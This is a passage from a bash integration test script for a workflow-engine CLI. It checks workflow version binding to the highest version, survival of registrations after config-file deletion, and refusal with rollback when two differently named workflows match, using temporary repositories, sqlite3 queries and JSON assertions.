  check_cond "ZG" "ZG28_rejected_hold_still_addressable" "the held artifact is gone after a rejection" [ "$ZG_C_HELDART" -ge 1 ]

  # H14: the materialized step ends `done` on BOTH paths — it recorded a
  # decision, which is what a gate does.
  local ZG_C_HELDSTATE
  ZG_C_HELDSTATE=$(sqlite3 "$ZG_C/issues.db" \
    "SELECT status FROM steps WHERE instance='reconcile-held@0#0';")
  check_cond "ZG" "ZG28_rejected_step_is_done" "the rejected held step is '$ZG_C_HELDSTATE', want done" [ "$ZG_C_HELDSTATE" = "done" ]

  # H16: a second decision on a resolved hold is CONFLICT (exit 4).
  run_env "$ZG_C" step reject "$ZG_C_HELDID" --note "again" --json
  assert_exit "ZG" "ZG28_double_decision_conflict" 4
  assert_json "ZG" "ZG28_double_decision_code" ".code" "CONFLICT"

  # ---------------------------------------------------------------------------
  # ZG29: GROUP-2 DORMANCY (§3).
  #
  # "`action_results` empty; a run with no `aggregate` step and no `payload`
  # declarations produces byte-identical step/artifact/threshold behavior to S4."
  # ---------------------------------------------------------------------------
  local ZG_D5
  ZG_D5=$(qa_mktemp_d)
  run_env "$ZG_D5" init >/dev/null

  local D5_AR
  D5_AR=$(sqlite3 "$ZG_D5/issues.db" "SELECT COUNT(*) FROM action_results;")
  check_cond "ZG" "ZG29_action_results_empty" "$D5_AR action results in a fresh repo" [ "$D5_AR" = "0" ]

  # A SCHEMA-LESS, ACTION-LESS workflow: registers, activates, runs, and its
  # threshold behaves exactly as S3/S4 specified — T1 evaluates, and
  # `action_results` stays empty because no action ever ran.
  cat >"$ZG_D5/plain.toml" <<'ZGPLAINEOF'
[pipeline]
name = "plain-change"
version = 1

[match]
kind = ["task"]

[[step]]
name = "measure"
after = []
executor = "measure"
emits = "report"
threshold = { "fix-loop" = "any(status == unmet)" }

# The loop body V17b requires (DKT-196), incidental to ZG29's subject — that a
# schema-LESS equality threshold still routes, since equality needs no declared
# order — but a `fix-loop` routing with nothing to enter is refused at
# registration.
[[step]]
name       = "repair"
executor   = "repair"
emits      = "fix-summary"
loop       = true
after_loop = "measure"
ZGPLAINEOF

  run_env "$ZG_D5" workflow register "$ZG_D5/plain.toml" --json
  assert_exit "ZG" "ZG29_schemaless_register" 0
  run_env "$ZG_D5" issue create -t "ZG29 subject" -d "a body" --json >/dev/null
  run_env "$ZG_D5" run start --issue DKT-1 --json >/dev/null
  run_env "$ZG_D5" run activate RUN-1 --json
  assert_exit "ZG" "ZG29_schemaless_activate" 0

  printf '[{"status":"unmet"}]\n' >"$ZG_D5/unmet.json"
  zg_complete_step "$ZG_D5" "measure@0" "$ZG_TMP/a-artifact.txt" "$ZG_D5/unmet.json"
  assert_exit "ZG" "ZG29_schemaless_complete" 0

  local D5_ROUTE D5_AR_AFTER D5_STUB
  D5_ROUTE=$(sqlite3 "$ZG_D5/issues.db" "SELECT routing FROM steps WHERE instance='measure@0';")
  D5_AR_AFTER=$(sqlite3 "$ZG_D5/issues.db" "SELECT COUNT(*) FROM action_results;")
  D5_STUB=$(sqlite3 "$ZG_D5/issues.db" "SELECT COUNT(*) FROM artifacts WHERE stub = 1;")
  check_cond "ZG" "ZG29_t1_unchanged" "a schema-less equality threshold routed '$D5_ROUTE', want fix-loop" [ "$D5_ROUTE" = "fix-loop" ]
  if [ "$D5_AR_AFTER" = "0" ] && [ "$D5_STUB" = "0" ]; then
    check "ZG" "ZG29_no_action_rows" "PASS"
  else
    check "ZG" "ZG29_no_action_rows" "FAIL" \
      "a run with no action step wrote $D5_AR_AFTER action results and $D5_STUB stub artifacts"
  fi

  # T3 still parks for a schema-less ORDERED comparison, with the S3 wording
  # MINUS its removed tail: a message promising stage 5 after stage 5 has
  # shipped is worse than no message. ZG22's repo is the subject.
  local ZG_T3_ROUTE_NOW
  ZG_T3_ROUTE_NOW=$(sqlite3 "$ZG_T3/issues.db" \
    "SELECT routing FROM steps WHERE instance='measure@0';")
  if printf '%s' "$ZG_T3_ROUTE_NOW" | grep -q 'ordered_enum' &&
     ! printf '%s' "$ZG_T3_ROUTE_NOW" | grep -q 'stage 5 supplies'; then
    check "ZG" "ZG29_t3_tail_removed" "PASS"
  else
    check "ZG" "ZG29_t3_tail_removed" "FAIL" \
      "the T3 park reads '$ZG_T3_ROUTE_NOW'"
  fi

  # ---------------------------------------------------------------------------
  # ZG30: BIND-TO-HIGHEST — the version-bump evolution path, end to end
  # (engine-spec §11.1 as amended 2026-08-05; found by the M2a toy run).
  #
  # THE RETRO LOOP COMPLETING IS THE POINT. The retro pipeline's whole output is
  # a bumped workflow version; before the amendment, registering that bump made
  # the very next activation refuse with "matches 2 workflows", so the loop
  # could produce an improvement it could never run. This section drives the
  # real sequence through the CLI — register @1, activate, bump to @2,
  # re-activate, activate a NEW run — because the Go tests drive binding
  # in-process and the failure that run hit was at the operator's keyboard.
  # ---------------------------------------------------------------------------

  local ZG_BUMP
  ZG_BUMP=$(qa_mktemp_d)
  run_env "$ZG_BUMP" init
  assert_exit "ZG" "ZG30_init" 0

  # A deliberately small workflow of its own name: the fixture is shared with
  # every other section here, and bumping IT would change what they bind.
  cat > "$ZG_BUMP/retro.toml" <<'TOML'
[pipeline]
name = "zg-retro"
version = 1

[match]
kind = ["task"]

[[step]]
name = "work"
after = []
executor = "someone"
emits = "result"
TOML
  run_env "$ZG_BUMP" workflow register "$ZG_BUMP/retro.toml" --json
  assert_exit "ZG" "ZG30_register_v1" 0

  run_env "$ZG_BUMP" issue create -t "ZG30 first" -d "a body" --json
  assert_exit "ZG" "ZG30_issue_one" 0
  run_env "$ZG_BUMP" run start --issue DKT-1 --json
  assert_json "ZG" "ZG30_start_one" ".data.run" "RUN-1"
  run_env "$ZG_BUMP" run activate RUN-1 --json
  assert_exit "ZG" "ZG30_activate_v1" 0

  # The bump — exactly what the retro skill emits: same name, next version.
  sed 's/version = 1/version = 2/' "$ZG_BUMP/retro.toml" > "$ZG_BUMP/retro-v2.toml"
  run_env "$ZG_BUMP" workflow register "$ZG_BUMP/retro-v2.toml" --json
  assert_exit "ZG" "ZG30_register_v2" 0

  # `workflow show` without @version resolves to the bump. Binding must agree
  # with this — their DISAGREEING was the defect.
  run_env "$ZG_BUMP" workflow show zg-retro --json
  assert_json "ZG" "ZG30_show_resolves_highest" ".data.version" "2"

  # THE WEDGE, as a regression: a new run over a name registered at two
  # versions activates, and binds the HIGHEST. Before the amendment this exited
  # 3 with "matches 2 workflows".
  run_env "$ZG_BUMP" issue create -t "ZG30 second" -d "a body" --json
  run_env "$ZG_BUMP" run start --issue DKT-2 --json
  assert_json "ZG" "ZG30_start_two" ".data.run" "RUN-2"
  run_env "$ZG_BUMP" run activate RUN-2 --json
  assert_exit "ZG" "ZG30_bump_activates" 0
  assert_json "ZG" "ZG30_bound_one" ".data.issues_bound" "1"

  run_env "$ZG_BUMP" run status RUN-2 --json
  assert_json "ZG" "ZG30_new_run_pins_v2" \
    '.data.pins | map(select(.kind == "workflow")) | .[0].ref' "zg-retro@2"

  # The IN-FLIGHT run is untouched: it pinned @1 and keeps @1 across a
  # re-activation, which is what makes the superseded version's continued
  # registration necessary rather than merely tolerated (RA2).
  run_env "$ZG_BUMP" run activate RUN-1 --json
  assert_exit "ZG" "ZG30_reactivate_inflight" 0
  assert_json "ZG" "ZG30_reactivation_flag" ".data.reactivation" "true"
  run_env "$ZG_BUMP" run status RUN-1 --json
  assert_json "ZG" "ZG30_inflight_keeps_v1" \
    '.data.pins | map(select(.kind == "workflow")) | .[0].ref' "zg-retro@1"

  # The superseded version is still REGISTERED and still reachable by explicit
  # @version. It stops binding; it does not disappear.
  run_env "$ZG_BUMP" workflow show zg-retro@1 --json
  assert_exit "ZG" "ZG30_v1_still_registered" 0
  assert_json "ZG" "ZG30_v1_version" ".data.version" "1"

  # A THIRD version, to prove the reduction is "highest" and not "latest
  # registered": @3 is registered, then @2's bytes are re-registered
  # idempotently, and binding must still pick @3.
  sed 's/version = 1/version = 3/' "$ZG_BUMP/retro.toml" > "$ZG_BUMP/retro-v3.toml"
  run_env "$ZG_BUMP" workflow register "$ZG_BUMP/retro-v3.toml" --json
  assert_exit "ZG" "ZG30_register_v3" 0
  run_env "$ZG_BUMP" workflow register "$ZG_BUMP/retro-v2.toml" --json
  assert_exit "ZG" "ZG30_reregister_v2" 0

  run_env "$ZG_BUMP" issue create -t "ZG30 third" -d "a body" --json
  run_env "$ZG_BUMP" run start --issue DKT-3 --json
  local ZG30_RUN3
  ZG30_RUN3=$(echo "$CMD_STDOUT" | jq -r '.data.run')
  run_env "$ZG_BUMP" run activate "$ZG30_RUN3" --json
  assert_exit "ZG" "ZG30_activate_highest" 0
  run_env "$ZG_BUMP" run status "$ZG30_RUN3" --json
  assert_json "ZG" "ZG30_pins_highest_not_latest" \
    '.data.pins | map(select(.kind == "workflow")) | .[0].ref' "zg-retro@3"

  # Two DIFFERENT names matching is STILL refused, and the error names both.
  # The reduction narrows within a name and nothing else: an ambiguity between
  # pipelines is an authoring problem core refuses rather than resolves.
  cat > "$ZG_BUMP/other.toml" <<'TOML'
[pipeline]
name = "zg-other"
version = 1

[match]
kind = ["task"]

[[step]]
name = "work"
after = []
executor = "someone"
emits = "result"
TOML
  run_env "$ZG_BUMP" workflow register "$ZG_BUMP/other.toml" --json
  assert_exit "ZG" "ZG30_register_other" 0

  run_env "$ZG_BUMP" issue create -t "ZG30 ambiguous" -d "a body" --json
  run_env "$ZG_BUMP" run start --issue DKT-4 --json
  local ZG30_AMBIG
  ZG30_AMBIG=$(echo "$CMD_STDOUT" | jq -r '.data.run')
  run_env "$ZG_BUMP" run activate "$ZG30_AMBIG" --json
  assert_exit "ZG" "ZG30_two_names_refused" 3
  assert_json "ZG" "ZG30_two_names_code" ".code" "VALIDATION_ERROR"
  assert_stdout_contains "ZG" "ZG30_names_issue" "DKT-4"
  assert_stdout_contains "ZG" "ZG30_names_highest" "zg-retro@3"
  assert_stdout_contains "ZG" "ZG30_names_other" "zg-other@1"
  # The BRANCH DISCRIMINATOR. Everything asserted above — exit 3,
  # VALIDATION_ERROR, the issue id, the candidate refs — is emitted by the
  # ZERO-match refusal too, so without this line the check pins "refused"
  # rather than "refused because two different names matched".
  assert_stdout_contains "ZG" "ZG30_multi_match_branch" "exactly one must match"

  # ...and it does NOT name the superseded versions: an error listing @1 and @2
  # would send an operator to edit a definition that could not have bound the
  # issue anyway.
  if printf '%s' "$CMD_STDOUT" | grep -qE 'zg-retro@[12]'; then
    check "ZG" "ZG30_omits_superseded" "FAIL" \
      "the ambiguity error names a superseded version that never binds"
  else
    check "ZG" "ZG30_omits_superseded" "PASS"
  fi

  rm -rf "$ZG_BUMP"

  # ---------------------------------------------------------------------------
  # ZG31: DELETION-SURVIVAL, through auto-registration (AC-D2). ZG30
  # above drives the bump sequence through `workflow register` with TOML files
  # that live OUTSIDE `.docket/config/` (in `$ZG_BUMP` itself), so it cannot
  # express deletion at all — there is no config-dir file to delete. This
  # section uses the AUTO-REGISTRATION path instead: files placed under
  # `config/workflows/` (DOCKET_PATH's config tree), which activation scans
  # and registers with no `workflow register` invocation. RENAME-PLUS-BUMP
  # (AC-D3) continues from this section's deleted-file state under its own
  # ZG32 banner below.
  # ---------------------------------------------------------------------------

  local ZG_DEL
  ZG_DEL=$(qa_mktemp_d)
  run_env "$ZG_DEL" init
  assert_exit "ZG" "ZG31_init" 0

  mkdir -p "$ZG_DEL/config/workflows"
  cat > "$ZG_DEL/config/workflows/zg-gone.toml" <<'TOML'
[pipeline]
name = "zg-gone"
version = 1

[match]
kind = ["task"]

[[step]]
name = "work"
after = []
executor = "someone"
emits = "result"
TOML

  run_env "$ZG_DEL" issue create -t "ZG31 first" -d "a body" --json
  assert_exit "ZG" "ZG31_issue_one" 0
  run_env "$ZG_DEL" run start --issue DKT-1 --json
  assert_json "ZG" "ZG31_start_one" ".data.run" "RUN-1"
  run_env "$ZG_DEL" run activate RUN-1 --json
  assert_exit "ZG" "ZG31_activate_registers" 0
  # Matched by name, not position: `docket init` scaffolds nothing into
  # config/ today, but a filter is safe against any future scaffolded
  # registration (e.g. a schema) landing at index 0 for an unrelated reason.
  assert_json "ZG" "ZG31_registered_zg_gone" \
    '.data.registered | map(select(.name == "zg-gone")) | length' "1"

  # DELETE THE TOML. The registration is a database row, not a file — nothing
  # in `loadDefinitions` re-reads the filesystem.
  rm -f "$ZG_DEL/config/workflows/zg-gone.toml"

  run_env "$ZG_DEL" issue create -t "ZG31 second" -d "a body" --json
  assert_exit "ZG" "ZG31_issue_two" 0
  run_env "$ZG_DEL" run start --issue DKT-2 --json
  assert_json "ZG" "ZG31_start_two" ".data.run" "RUN-2"
  run_env "$ZG_DEL" run activate RUN-2 --json
  assert_exit "ZG" "ZG31_activate_after_deletion" 0

  # THE ASSERTION THAT MAKES THIS NON-VACUOUS: the second activation registers
  # NOTHING (the file is genuinely gone from the scan) and STILL binds.
  #
  # `null | length` is 0 in jq, so ZG31_scan_finds_nothing below would pass
  # just as readily on an ERROR envelope (no `.data` at all, `registered` is
  # `omitempty` so a genuine empty scan omits the key too — `has("registered")`
  # cannot distinguish the two) as on a genuine empty scan, and today it is
  # honest only because ZG31_activate_after_deletion's exit-code check sits
  # immediately above — an undeclared ordering dependency. This combined check
  # ties the empty-scan fact to `.data.issues_bound` from the SAME envelope in
  # one jq expression, so it can only pass when `.data` genuinely came from a
  # successful response, independently of any other check's position.
  assert_json "ZG" "ZG31_scan_empty_and_bound" \
    '(((.data.registered // []) | length) == 0) and (.data.issues_bound == 1)' "true"
  assert_json "ZG" "ZG31_scan_finds_nothing" \
    '.data.registered | length' "0"
  assert_json "ZG" "ZG31_bound_despite_deletion" ".data.issues_bound" "1"
  run_env "$ZG_DEL" run status RUN-2 --json
  assert_json "ZG" "ZG31_pin_survives_deletion" \
    '.data.pins | map(select(.kind == "workflow")) | .[0].ref' "zg-gone@1"

  # ---------------------------------------------------------------------------
  # ZG32: RENAME-PLUS-BUMP (AC-D3). Continuing from ZG31's
  # deleted-file state: a NEW name, at a higher version, matching the same
  # issue kind. Both names remain registered AS ROWS — the old one because
  # deletion does not retire it (ZG31), the new one because it just
  # registered — so the issue now matches TWO different names, which is the
  # ambiguity `bindIssue` refuses. The refusal rolls back the transaction that
  # would have written the new registration, so AFTER the refusal only the OLD
  # name is visible to `workflow list`; ZG32_registry_after_refusal below
  # asserts that state directly rather than leaving it implied.
  #
  # THIS IS A CHARACTERIZATION CHECK. It pins today's refusal; it does not
  # assert the refusal is correct. A future retire verb (re-scoped per the
  # AC-D4 verdict to the lifecycle-verbs issue that owns that verb) is
  # expected to change this outcome deliberately, and the literal candidate
  # string below is what makes that change a visible, intentional edit rather
  # than a silent one.
  # ---------------------------------------------------------------------------

  cat > "$ZG_DEL/config/workflows/zg-gone-renamed.toml" <<'TOML'
[pipeline]
name = "zg-gone-renamed"
version = 2

[match]
kind = ["task"]

[[step]]
name = "work"
after = []
executor = "someone"
emits = "result"
TOML

  run_env "$ZG_DEL" issue create -t "ZG32 rename plus bump" -d "a body" --json
  assert_exit "ZG" "ZG32_issue" 0
  run_env "$ZG_DEL" run start --issue DKT-3 --json
  assert_json "ZG" "ZG32_start" ".data.run" "RUN-3"
  run_env "$ZG_DEL" run activate RUN-3 --json
  assert_exit "ZG" "ZG32_two_names_refused" 3
  assert_json "ZG" "ZG32_two_names_code" ".code" "VALIDATION_ERROR"
  assert_stdout_contains "ZG" "ZG32_names_issue" "DKT-3"
  # The ordered, joined candidate list — not two separate substring checks for
  # "zg-gone@1" and "zg-gone-renamed@2", which this literal strictly subsumes
  # (it cannot pass while either substring is absent) and which add no
  # coverage of their own. This is what a future retire verb must break
  # LOUDLY, matching the Go side's literal `wantCandidates` in
  # TestRenamePlusBumpRefusesActivation.
  assert_stdout_contains "ZG" "ZG32_names_joined" "zg-gone@1, zg-gone-renamed@2"
  # The BRANCH DISCRIMINATOR. The joined candidate list above is
  # rendered by refList in BOTH refusal branches and in the same order, so it
  # does not distinguish them. This literal is the only text that does; a
  # probe at kind = ["epic"] against a task issue passed every other
  # assertion here on the zero-match error.
  assert_stdout_contains "ZG" "ZG32_multi_match_branch" "exactly one must match"

  # THE ROLLBACK, made visible: the refused activation registered nothing, so
  # only the pre-existing "zg-gone" is a real row. "zg-gone-renamed" never
  # committed, despite matching the (rolled-back) candidate list above.
  run_env "$ZG_DEL" workflow list --json
  assert_json "ZG" "ZG32_registry_after_refusal" ".data.workflows | length" "1"
  assert_json "ZG" "ZG32_registry_only_old_name" \
    '.data.workflows | map(select(.name == "zg-gone")) | length' "1"

  rm -rf "$ZG_DEL"

  rm -rf "$ZG_A" "$ZG_B" "$ZG_C" "$ZG_D5"

  rm -rf "$ZG_SC" "$ZG_DORM9" "$ZG_S4" "$ZG_FX9"

  rm -rf "$ZG_L" "$ZG_T3" "$ZG_D4" "$ZG_FX4"

  rm -rf "$ZG_S" "$ZG_RACE" "$ZG_K" "$ZG_G"

  rm -rf "$ZG_DORM" "$ZG_RUN" "$ZG_FX" "$ZG_TMP"
}
